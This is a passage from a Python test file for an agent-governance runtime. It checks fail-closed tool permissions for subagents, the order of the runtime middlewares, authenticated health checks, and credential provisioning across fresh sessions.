    undeclared = asyncio.run(decide(f"agentgov-{digest}-summarizer"))

    assert allowed.behavior is PermissionBehavior.ALLOW
    assert cross_harness.behavior is PermissionBehavior.DENY
    assert undeclared.behavior is PermissionBehavior.DENY


def test_subagent_permission_is_intersected_with_main_harness_policy(tmp_path: Path) -> None:
    workspace = tmp_path / "runtime-workspace"
    _write_policy_manifest(workspace, allowed=["Read(**)", "mcp__sec-ops__list_alerts"], denied=[])
    subagent = workspace / "subagents" / "summarizer"
    subagent.mkdir(parents=True)
    (subagent / "AGENT.md").write_text("Summarize supplied evidence only.\n", encoding="utf-8")
    (subagent / "agent.yaml").write_text(
        json.dumps(
            {
                "agent": {"id": "summarizer", "description": "Offline summarizer", "system_prompt": "AGENT.md"},
                "session": {"permission_mode": "dont_ask"},
                "workspace_policy": {"fail_closed": True, "allowed_tools": ["Read(**)"], "denied_tools": []},
            },
        ),
        encoding="utf-8",
    )
    digest = harness_digest(workspace)
    template = load_subagent_templates(workspace, digest)[f"agentgov-{digest}-summarizer"]
    middleware = AgentGovPolicyMiddleware(workspace)
    agent = SimpleNamespace(state=SimpleNamespace(permission_context=template.permission_context))

    def external_mcp() -> ToolChunk:
        raise AssertionError("permission test must not execute the tool")

    async def native(**_: object) -> PermissionDecision:
        raise AssertionError("AgentGov policy must remain fail-closed")

    async def decide(tool: object, tool_input: dict[str, object]) -> PermissionDecision:
        return await middleware.on_check_permission(
            agent,
            {"tool_call": object(), "tool": tool, "tool_input": tool_input},
            native,
        )

    read = asyncio.run(decide(Read(), {"file_path": "public.txt"}))
    mcp = asyncio.run(decide(FunctionTool(external_mcp, name="mcp__sec-ops__lookup"), {}))

    assert read.behavior is PermissionBehavior.ALLOW
    assert mcp.behavior is PermissionBehavior.DENY


def test_runtime_app_uses_public_agentscope_factory_and_single_node_components(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    settings = _settings(tmp_path)
    shutdowns: list[str] = []
    monkeypatch.setattr(
        "agentscope_runtime.service.configure_otel_from_env",
        lambda: SimpleNamespace(shutdown=lambda: shutdowns.append("shutdown")),
    )
    app = create_runtime_app(settings)

    assert isinstance(app.state.storage, AsyncSQLAlchemyStorage)
    assert isinstance(app.state.message_bus, InMemoryMessageBus)
    assert isinstance(app.state.workspace_manager, AgentGovWorkspaceManager)
    assert app.state.knowledge_base_manager is None
    assert app.state.enable_index_worker is False
    assert app.state.enable_channel_worker is False
    assert app.state.enable_scheduler is False
    assert app.state.mcp_hubs == {}
    assert app.state.skill_hubs == {}
    assert app.state.channel_type_registry.list_types() == []
    middleware_classes = [middleware.cls for middleware in app.user_middleware]
    assert middleware_classes[0] is FixedRuntimeUserMiddleware
    assert middleware_classes.index(SessionWorkspaceReleaseMiddleware) > 0

    source = _write_harness(settings.candidates_root, "candidate-soc-ops", "conversion-evidence")
    _write_policy_manifest(source, allowed=[], denied=[])
    digest = harness_digest(source)

    async def assemble_middlewares():
        workspace = await app.state.workspace_manager.get_workspace(
            RUNTIME_USER_ID,
            "runtime-agent",
            "session-1",
            f"candidate-soc-ops--v-{digest}",
        )
        return await app.state.extra_agent_middlewares(
            RUNTIME_USER_ID,
            "runtime-agent",
            "session-1",
            workspace,
        )

    middlewares = asyncio.run(assemble_middlewares())
    assert isinstance(middlewares[0], AgentGovTraceContextMiddleware)
    assert isinstance(middlewares[1], TracingMiddleware)
    assert isinstance(middlewares[2], AgentGovReceiptMiddleware)
    assert isinstance(middlewares[3], GovernedHarnessEvidenceMiddleware)
    assert isinstance(middlewares[4], MCPResourceMiddleware)
    assert isinstance(middlewares[5], AgentGovPolicyMiddleware)

    with TestClient(app) as client:
        assert client.get("/health").status_code == 401
        response = client.get(
            "/health",
            headers=_runtime_headers(settings, "GET", "/health"),
        )
        assert response.status_code == 200
        assert response.json()["status"] == "ok"
    assert shutdowns == ["shutdown"]
    assert (settings.data_dir / "agentscope.db").is_file()


def test_runtime_lifespan_idempotently_provisions_credential_for_fresh_session(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    settings = _settings(tmp_path)
    source = _write_harness(settings.candidates_root, "candidate-soc-ops", "legacy-digest")
    digest = harness_digest(source)
    monkeypatch.setattr(
        "agentscope_runtime.service.configure_otel_from_env",
        lambda: None,
    )
    first_app = create_runtime_app(settings)
    with TestClient(first_app) as client:
        agent = _runtime_json(client, settings, "POST", "/agent/", {"name": "SOC Agent"})
        assert agent.status_code == 201
        session = _runtime_json(
            client,
            settings,
            "POST",
            "/sessions/",
            {
                "agent_id": agent.json()["agent_id"],
                "workspace_id": f"candidate-soc-ops--v-{digest}",
                "chat_model_config": {
                    "type": settings.credential_type,
                    "credential_id": settings.credential_id,
                    "model": "provider-model",
                    "parameters": {},
                },
            },
        )
        assert session.status_code == 201
        assert session.json()["session_id"]

    second_app = create_runtime_app(settings)
    with TestClient(second_app) as client:
        agent = _runtime_json(client, settings, "POST", "/agent/", {"name": "SOC Agent 2"})
        assert agent.status_code == 201
        session = _runtime_json(
            client,
            settings,
            "POST",
            "/sessions/",
            {
                "agent_id": agent.json()["agent_id"],
                "workspace_id": f"candidate-soc-ops--v-{digest}",
                "chat_model_config": {
                    "type": settings.credential_type,
                    "credential_id": settings.credential_id,
                    "model": "provider-model",
                    "parameters": {},
                },
            },
        )
        assert session.status_code == 201
